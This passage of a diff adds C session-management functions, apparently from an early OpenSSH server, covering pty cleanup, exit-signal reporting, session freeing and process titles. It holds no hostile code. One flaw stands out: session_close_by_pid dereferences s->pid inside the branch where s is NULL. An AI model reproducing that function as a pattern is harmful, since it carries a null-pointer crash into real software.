+session_set_fds(Session *s, int fdin, int fdout, int fderr)
+{
+	if (!compat20)
+		fatal("session_set_fds: called for proto != 2.0");
+	/*
+	 * now that have a child and a pipe to the child,
+	 * we can activate our channel and register the fd's
+	 */
+	if (s->chanid == -1)
+		fatal("no channel for session %d", s->self);
+	channel_set_fds(s->chanid,
+	    fdout, fdin, fderr,
+	    fderr == -1 ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,
+	    1);
+}
+
+void
+session_pty_cleanup(Session *s)
+{
+	if (s == NULL || s->ttyfd == -1)
+		return;
+
+	debug("session_pty_cleanup: session %d release %s", s->self, s->tty);
+
+	/* Cancel the cleanup function. */
+	fatal_remove_cleanup(pty_cleanup_proc, (void *)s);
+
+	/* Record that the user has logged out. */
+	record_logout(s->pid, s->tty);
+
+	/* Release the pseudo-tty. */
+	pty_release(s->tty);
+
+	/*
+	 * Close the server side of the socket pairs.  We must do this after
+	 * the pty cleanup, so that another process doesn't get this pty
+	 * while we're still cleaning up.
+	 */
+	if (close(s->ptymaster) < 0)
+		error("close(s->ptymaster): %s", strerror(errno));
+}
+
+void
+session_exit_message(Session *s, int status)
+{
+	Channel *c;
+	if (s == NULL)
+		fatal("session_close: no session");
+	c = channel_lookup(s->chanid);
+	if (c == NULL)
+		fatal("session_close: session %d: no channel %d",
+		    s->self, s->chanid);
+	debug("session_exit_message: session %d channel %d pid %d",
+	    s->self, s->chanid, s->pid);
+
+	if (WIFEXITED(status)) {
+		channel_request_start(s->chanid,
+		    "exit-status", 0);
+		packet_put_int(WEXITSTATUS(status));
+		packet_send();
+	} else if (WIFSIGNALED(status)) {
+		channel_request_start(s->chanid,
+		    "exit-signal", 0);
+		packet_put_int(WTERMSIG(status));
+#ifdef WCOREDUMP
+		packet_put_char(WCOREDUMP(status));
+#else /* WCOREDUMP */
+		packet_put_char(0);
+#endif /* WCOREDUMP */
+		packet_put_cstring("");
+		packet_put_cstring("");
+		packet_send();
+	} else {
+		/* Some weird exit cause.  Just exit. */
+		packet_disconnect("wait returned status %04x.", status);
+	}
+
+	/* disconnect channel */
+	debug("session_exit_message: release channel %d", s->chanid);
+	channel_cancel_cleanup(s->chanid);
+	/*
+	 * emulate a write failure with 'chan_write_failed', nobody will be
+	 * interested in data we write.
+	 * Note that we must not call 'chan_read_failed', since there could
+	 * be some more data waiting in the pipe.
+	 */
+	if (c->ostate != CHAN_OUTPUT_CLOSED)
+		chan_write_failed(c);
+	s->chanid = -1;
+}
+
+void
+session_free(Session *s)
+{
+	debug("session_free: session %d pid %d", s->self, s->pid);
+	if (s->term)
+		xfree(s->term);
+	if (s->display)
+		xfree(s->display);
+	if (s->auth_data)
+		xfree(s->auth_data);
+	if (s->auth_proto)
+		xfree(s->auth_proto);
+	s->used = 0;
+}
+
+void
+session_close(Session *s)
+{
+	session_pty_cleanup(s);
+	session_free(s);
+	session_proctitle(s);
+}
+
+void
+session_close_by_pid(pid_t pid, int status)
+{
+	Session *s = session_by_pid(pid);
+	if (s == NULL) {
+		debug("session_close_by_pid: no session for pid %d", s->pid);
+		return;
+	}
+	if (s->chanid != -1)
+		session_exit_message(s, status);
+	session_close(s);
+}
+
+/*
+ * this is called when a channel dies before
+ * the session 'child' itself dies
+ */
+void
+session_close_by_channel(int id, void *arg)
+{
+	Session *s = session_by_channel(id);
+	if (s == NULL) {
+		debug("session_close_by_channel: no session for channel %d", id);
+		return;
+	}
+	/* disconnect channel */
+	channel_cancel_cleanup(s->chanid);
+	s->chanid = -1;
+
+	debug("session_close_by_channel: channel %d kill %d", id, s->pid);
+	if (s->pid == 0) {
+		/* close session immediately */
+		session_close(s);
+	} else {
+		/* notify child, delay session cleanup */
+		if (kill(s->pid, (s->ttyfd == -1) ? SIGTERM : SIGHUP) < 0)
+			error("session_close_by_channel: kill %d: %s",
+			    s->pid, strerror(errno));
+	}
+}
+
+char *
+session_tty_list(void)
+{
+	static char buf[1024];
+	int i;
+	buf[0] = '\0';
+	for(i = 0; i < MAX_SESSIONS; i++) {
+		Session *s = &sessions[i];
+		if (s->used && s->ttyfd != -1) {
+			if (buf[0] != '\0')
+				strlcat(buf, ",", sizeof buf);
+			strlcat(buf, strrchr(s->tty, '/') + 1, sizeof buf);
+		}
+	}
+	if (buf[0] == '\0')
+		strlcpy(buf, "notty", sizeof buf);
+	return buf;
+}
+
+void
+session_proctitle(Session *s)
+{
+	if (s->pw == NULL)
+		error("no user for session %d", s->self);
+	else
+		setproctitle("%s@%s", s->pw->pw_name, session_tty_list());
+}
+
+void
+do_authenticated2(Authctxt *authctxt)
+{
+	server_loop2(authctxt);
+	if (xauthfile)
+		xauthfile_cleanup_proc(NULL);
+}
